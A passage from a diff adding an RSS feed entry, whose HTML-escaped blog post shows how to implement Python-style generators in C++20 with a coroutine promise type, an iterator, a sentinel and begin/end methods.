+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;promise_type&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;int&lt;/span&gt; value;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;bool&lt;/span&gt; finished;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Generator &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;get_return_object&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;return&lt;/span&gt; { std&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;::&lt;/span&gt;coroutine_handle&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;lt;&lt;/span&gt;promise_type&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;gt;::&lt;/span&gt;from_promise(&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;this&lt;/span&gt;) };
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        std&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;::&lt;/span&gt;suspend_never initial_suspend() { &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;return&lt;/span&gt; {}; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        std&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;::&lt;/span&gt;suspend_never final_suspend() &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;noexcept&lt;/span&gt; { &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;return&lt;/span&gt; {}; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;unhandled_exception&lt;/span&gt;() {}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        std&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;::&lt;/span&gt;suspend_always yield_value(&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;int&lt;/span&gt; val) { value &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;=&lt;/span&gt; val; &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;return&lt;/span&gt; {}; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;return_void&lt;/span&gt;() { finished &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#0086b3&#34;&gt;true&lt;/span&gt;; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    };
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    std&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;::&lt;/span&gt;coroutine_handle&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;lt;&lt;/span&gt;promise_type&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;gt;&lt;/span&gt; handle;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ...
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Just like above, we store the handle in the return type, and we store any yielded values in the promise type. Here we also store a boolean indicating if the coroutine is finished. Next, let&amp;rsquo;s define our iterator.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;Generator&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;Sentinel&lt;/span&gt; {};
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;Iterator&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Generator &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;amp;&lt;/span&gt;g;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;operator&lt;/span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;*&lt;/span&gt;() &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;const&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;return&lt;/span&gt; g.handle.promise().value;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Iterator&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;operator&lt;/span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;++&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            g.handle.resume();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;this&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;friend&lt;/span&gt; &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;operator&lt;/span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;==&lt;/span&gt;(&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;const&lt;/span&gt; Iterator &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;amp;&lt;/span&gt;it, Sentinel) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;return&lt;/span&gt; it.g.handle.promise().finished;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;friend&lt;/span&gt; &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;operator&lt;/span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;!=&lt;/span&gt;(&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;const&lt;/span&gt; Iterator &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;amp;&lt;/span&gt;it, Sentinel) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;!&lt;/span&gt;it.g.handle.promise().finished;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    };
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ...
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The dereference operation just returns the last value yielded from the coroutine, and the &lt;code&gt;++&lt;/code&gt; operator resumes the coroutine. The &lt;code&gt;==&lt;/code&gt; and &lt;code&gt;!=&lt;/code&gt; operators check if the iterator is at the end by checking the &lt;code&gt;.finished&lt;/code&gt; flag in the promise.&lt;/p&gt;
+&lt;p&gt;Finally, we can write our &lt;code&gt;.begin()&lt;/code&gt; and &lt;code&gt;.end()&lt;/code&gt; to make &lt;code&gt;Generator&lt;/code&gt; iterable:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;Generator&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Iterator begin() { &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;return&lt;/span&gt; { &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;this&lt;/span&gt; }; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Sentinel &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;end&lt;/span&gt;() { &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;return&lt;/span&gt; {}; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And that&amp;rsquo;s it! Python-style generators in about 50 lines of code.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://godbolt.org/z/8obsThhde&#34;&gt;Try the code here&lt;/a&gt;&lt;/p&gt;
+</description>
+	</item>
+	
+	</channel>
+</rss>
